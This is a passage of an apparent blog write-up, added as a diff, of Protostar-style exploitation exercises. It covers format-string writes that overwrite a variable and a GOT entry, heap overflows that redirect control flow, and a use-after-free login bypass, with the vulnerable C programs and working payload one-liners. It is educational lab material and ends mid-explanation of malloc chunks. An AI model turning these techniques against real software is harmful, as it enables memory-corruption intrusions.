+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Once again, we build on the previous challenge: we have to write a specific value, and this time we can’t do it on a single write but need to split it on multiple %x-%n runs. We start using <code class="language-plaintext highlighter-rouge">objdump -t format3 | grep target</code> to find out that target is at address 0x080496f4</li>
+  <li>Next step, spamming format3 to find out how many pops we have to do to get the target address at the right place at the top of the stack:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print 'AAAA' + '%x'*20"</span> <span class="o">&gt;</span> /tmp/format3.in
+ ./format3 &lt; /tmp/format3.in
+</code></pre></div>    </div>
+  </li>
+  <li>Correct pop amount is 12. We swap our pattern with the target address, we remove a pop and instead put a ‘%n’ in there.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x%x%x%x%x%x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
+ ./format3 &lt; /tmp/format3.in
+</code></pre></div>    </div>
+  </li>
+  <li>This results in writing target lowest byte pair with 41. Therefore we need to add a couple of bytes in what we print with the ‘%x’ to increase that value:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
+ ./format3 &lt; /tmp/format3.in
+</code></pre></div>    </div>
+  </li>
+  <li>The next step requires to write to the second-lowest byte pair. We repeat the spamming with a known patter appending it to the string that we already have. Note that we inserted also ‘BBBB’ in our spamming pattern, because on a first run just with ‘AAAA’ it looked like the bytes were not aligned properly to result in a clean address after the popping. After playing around, the right amount of pops is 8.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AABBBBAA%x%x%x%x%x%x%x%x'"</span> <span class="o">&gt;</span> /tmp/format3.in
+ ./format3 &lt; /tmp/format3.in
+</code></pre></div>    </div>
+  </li>
+  <li>Our destination address is still the target address, but incremented by one as we are writing to a higher position. So, in our new string swap the pattern at the right position with the address, and replace the last ‘%x’ with ‘%n’. Another two bytes of target will be written.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08AA%473x%x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
+ ./format3 &lt; /tmp/format3.in
+</code></pre></div>    </div>
+  </li>
+  <li>To get the right value in target we have to put a rather high value in the bytes printed by ‘%x’. This does not matter, even if it overflows, because we will be anyway overwriting the higher byte in the next step.</li>
+  <li>
+    <p>Repeat the last steps for the remaining bytes, remembering to increase the target address by one. When all the bytes are done and contain the right value, the challenge is done.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08AA%473x%x%x%x%x%x%x' + '%n' + 'BBB</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08%125x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
+ ./format3 &lt; /tmp/format3.in
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="format-04">[Format 04]</h3>
+<p>Redirect execution in a process</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">hello</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"code execution redirected! you win</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>   
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Global Offset Table: also called GOT, it is a table of addresses stored in the data section. During runtime it lists addresses of global variables: when the program runs for the first time, the GOT is initialized to 0x00000000 for every external function; the first time it runs that function, it will cache the actual memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. To see the (uninitialized) GOT we can use objdump -R</p>
+</blockquote>
+
+<blockquote>
+  <p>Buffer size: to overwrite an address, we need to know exactly how far we have to write in our buffer. To do this, we can take the target address (let’s say 0x080484b4) and split it in byte pairs (b4, 84, 08, 08 little endian).
+We get the first offset by starting gdb, executing the program and looking at the content of the address of the function that we want to overwrite (this address is the one showed in the GOT). Let’s say the value is 0x00000010: take the first byte pair and subtract this value to get the buffer length, meaning 0xb4 - 0x10 = 164. For the second one, take the 2nd byte pair (84) and subtract the first byte pair (b4). To correct the negative result we add a “1” in the most significant digit of the first number, meaning “184”. We then subtract again, and get 208.
+Doing this for all pairs results in the offsets that are needed to make the overwriting work at the correct places.</p>
+</blockquote>
+
+<blockquote>
+  <p>Direct Parameter Access: It allows us to reference subsequent printf arguments, without using the prior arguments: printf(“%4$d”, 1, 2, 3, 4, 5) will print 4.</p>
+</blockquote>
+
+<ol>
+  <li>
+    <p>The challenge is exactly the same as in the previous level, but instead of overwriting a variable we have to overwrite an address to which we want to jump. This address is the one of the <code class="language-plaintext highlighter-rouge">exit()</code> method (not _exit, as that would be called only after the exploit has already been done), that we can retrieve from the GOT table. The new address, meaning the one of the <code class="language-plaintext highlighter-rouge">hello()</code> method, is found with the usual command.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> objdump <span class="nt">-R</span> format4 | <span class="nb">grep exit</span> <span class="c"># target address is 0x08049724</span>
+ objdump <span class="nt">-t</span> format4 | <span class="nb">grep </span>hello <span class="c"># new address is 0x080484b4</span>
+</code></pre></div>    </div>
+  </li>
+  <li>There might be a little trick in the address of exit: if the method has never been executed before, what we get with the lookup is only the position in the GOT table. To actually know where the method is we need to fire up gdb, start up the program and look into what is in that address using <code class="language-plaintext highlighter-rouge">x/i 0x08049724</code></li>
+  <li>Although it might be worth looking, executing format4 at least once before inspecting the GOT table should solve the problem. If you reach the end and there stuff is not working, maybe take a look at the last step and check that you are working with the proper address.</li>
+  <li>Next steps are exactly like format3: iteratively spam with a known pattern to find where to put the target address and how many pops are needed; actually insert the address and swap the last ‘%x’ with ‘%n’, check how many additional bytes you need to get the correct value at the desired place.</li>
+  <li>As we don’t have a variable that will be printed with our results, checking that we are writing the right values at the right positions will require using gdb and constantly checking with <code class="language-plaintext highlighter-rouge">gdb &gt; x/x 0x08049724</code></li>
+  <li>
+    <p>The finished payload looks like the following:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%160x%x%x' + '%n' + 'A</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08BBB' + '%184x%x%x' + '%n' + 'AA</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08AA' + '%352x%x%x%x' + '%n' + 'A</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08CDD' + '%228x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format4.in
+ ./format4 &lt; /tmp/format4.in
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="heap-00">[Heap 00]</h3>
+<p>Heap overflow to influence code flow</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">data</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">fp</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+<span class="p">};</span>
+
+<span class="kt">void</span> <span class="nf">winner</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"level passed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">nowinner</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"level has not been passed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="k">struct</span> <span class="n">data</span> <span class="o">*</span><span class="n">d</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">fp</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
+
+    <span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">data</span><span class="p">));</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fp</span><span class="p">));</span>
+    <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span> <span class="o">=</span> <span class="n">nowinner</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    
+    <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>void* malloc( size_t size ): allocates size bytes of uninitialized storage in the heap. If allocation succeeds, returns a pointer to the first byte in the allocated memory block that is suitably aligned for any object type.</p>
+</blockquote>
+
+<ol>
+  <li>The core of this challenge is that the structs are initialized using malloc to be allocated in the heap. Structs d and f are allocated immediately after another, meaning that overflowing d results in overwriting f.</li>
+  <li>Our goal is to overwrite the function pointer defined in f with the address of the winner method. That address can be retrieved with <code class="language-plaintext highlighter-rouge">objdump -t heap0 | grep winner</code> and corresponds to 0x08048464</li>
+  <li>
+    <p>The next step is to find out how long does the input that is used to initialize d need to be to overwrite f and its function pointer. We use the same technique that we used for the stack challenges: run the program with gdb and the pattern:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gdb <span class="nt">--args</span> heap0 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</code></pre></div>    </div>
+  </li>
+  <li>We can see what the content of $eip is when the program goes into segmentation fault, and passing this value back to the website tells us that we have an offset of 72 bytes.</li>
+  <li>The difference between this attack and the stack overflow attacks is that in this case we are not overwriting the return address in the stack, instead we are overwriting the content of f-&gt;fp. This means that the segmentation fault does not aries when returning from the strcpy call, but only at the moment when we try to call f-&gt;fp() and the pointer contained there (and stored in the heap) is not a proper address.</li>
+  <li>
+    <p>So what we have to do is pass to heap0 72 bytes of padding, and then the address of the winner method (remembering endianness):</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap0 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'A' * 72 + '</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="heap-01">[Heap 01]</h3>
+<p>Code flow hijacking in data overwrite cases.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">internet</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">priority</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kt">void</span> <span class="nf">winner</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"and we have a winner @ %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="k">struct</span> <span class="n">internet</span> <span class="o">*</span><span class="n">i1</span><span class="p">,</span> <span class="o">*</span><span class="n">i2</span><span class="p">,</span> <span class="o">*</span><span class="n">i3</span><span class="p">;</span>
+
+    <span class="n">i1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
+    <span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+    <span class="n">i2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
+    <span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"and that's a wrap folks!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>The overflow in this case is expected to happen when assigning the name to the internet objects: the allocated space for the names is at most 8 characters, but there are no checks in place that the length of the input actually corresponds. Also, each struct contains a name pointer that is allocated separately, meaning that we can expect the heap to be structured as follows: <code class="language-plaintext highlighter-rouge">[i1 struct][i1-&gt;name][i2 struct][i2-&gt;name]</code></li>
+  <li>Playing with input we realize that we can cause a segmentation fault with too long names. So back at our nice offset-calculating service, we pass the arguments at gdb, run it and retrieve the address causing the segfault. After feeding it back to the offset service, we are nicely informed that our segfault happens at 20 bytes of input.</li>
+  <li>The overflowed ‘i2-&gt;name’ field means that we can control the destination for the second strcpy command. This means that we should redirect the return address of main on the stack with the memory address of winner, that we can retrieve with the usual objdump and corresponds to 0x08048494.</li>
+  <li>
+    <p>To find the location of the return address, we use <code class="language-plaintext highlighter-rouge">gdb &gt; disassemble main</code>, put a breakpoint at the ret instruction, and when the breakpoint is reached look at what is the content of $esp:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gdb <span class="o">&gt;</span> disas main
+ gdb <span class="o">&gt;</span> b <span class="k">**</span>0x08048567
+ gdb <span class="o">&gt;</span> run asdf asdf
+ gdb <span class="o">&gt;</span> i r <span class="nv">$esp</span>
+</code></pre></div>    </div>
+  </li>
+  <li>From gdb we know that $esp contains the return address 0xbffff68c. We have to keep in mind that when not using gdb, the addresses will not correspond exactly to what we have seen using the debugger. Therefore, the return address will not be precise.</li>
+  <li>A workaround for this is to repeatedly write our own target address starting from a bit before what gdb told us, and continuing a bit after. With this approach, we are sure that at some point we will be writing at the right location.</li>
+  <li>
+    <p>The first argument is made by the 20 random bytes and a address lower than our known gdb-related return address, than we need a space to respect the syntax of the heap1 program, and then we have a sled of our target address. At some point the target address will be hit and we will reach the winner method.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'A' * 20 + '</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf' + ' ' + '</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' * 8"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="heap-02">[Heap 02]</h3>
+<p>What can happen when heap pointers are stale? (This level is completed when you see the “you have logged in already!” message)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">auth</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">auth</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">auth</span> <span class="o">*</span><span class="n">auth</span><span class="p">;</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">service</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">service</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+        
+        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"auth "</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">auth</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
+            <span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">31</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"reset"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"service"</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">service</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"login"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"you have logged in already!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"please enter your password</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Use after free: this vulnerability is a type of memory corruption that corresponds to trying to access memory after it has been freed. This can cause a program to crash or to execute arbitrary code in case the freed memory has already been filled with new data.</p>
+</blockquote>
+
+<blockquote>
+  <p>int strncmp(const char *str1, const char *str2, size_t n): compares at most the first n bytes of str1 and str2, returning 0 if they are equal.</p>
+</blockquote>
+
+<blockquote>
+  <p>char *strdup(const char *str1): returns a pointer to a null-terminated byte string, which is a duplicate of the string pointed to by str1. The pointer is to a newly allocated chunk of memory in the heap</p>
+</blockquote>
+
+<ol>
+  <li>This program offers different commands that can be used in a loop: auth (+ arg), reset, service (+ arg), and login. Depending on the order these commands are issued, it is possible to cause an use-after-free problem: first invoking auth, then freeing it with reset, then attempting login will result in the last command accessing auth-&gt;auth when that memory is not allocated for that use anymore.</li>
+  <li>Our goal is to fill the original auth struct with 1s, so that when checking auth-&gt;auth during the login, the conditional will recognize us as already logged in.</li>
+  <li>Based on the fact that in the heap the space is allocated sequentially, putting new chunks immediately after already allocated ones, we can run our commands so that the following happens: we call auth to allocate the memory needed for that struct; then we call reset to free it. However, the “auth” pointer still exists in the program, although it should not be used anymore.</li>
+  <li>
+    <p>The next step is to call service and pass it a bunch of ‘1’: service will call strdup, which allocates space in the memory just freed by releasing auth. As last, we call login: the auth pointer will be used as if the respective memory was still legitimately in use, and if we passed enough 1s with the service call, one of those 1 will be interpreted as auth-&gt;auth, allowing us to get in.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap2
+     <span class="o">[</span> auth <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, service <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+ auth AAAAAAAA
+     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+ reset
+     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+ service 11111111111111111111111111111
+     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> 0x804c018 <span class="o">]</span>
+ login
+ you have logged <span class="k">in </span>already!
+     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> 0x804c018 <span class="o">]</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="heap-03">[Heap 03]</h3>
+<p>How heap meta data can be modified to change program execution.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">winner</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"that wasn't too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
+
+    <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"dynamite failed?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Malloc chunk: Let’s look at the structure of a free chunk of heap memory, as interpreted in malloc instructions:</p>
+
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  struct malloc_chunk {
+       INTERNAL_SIZE_T     prev_size;
+       INTERNAL_SIZE_T     size;
+       struct malloc_chunk*    fd;
+       struct malloc_chunk*    bk;
+   }
+</code></pre></div>  </div>
+
+  <p>The prev_size member contains the size of the chunk previous to the current chunk. It is only used if the previous chunk is free.
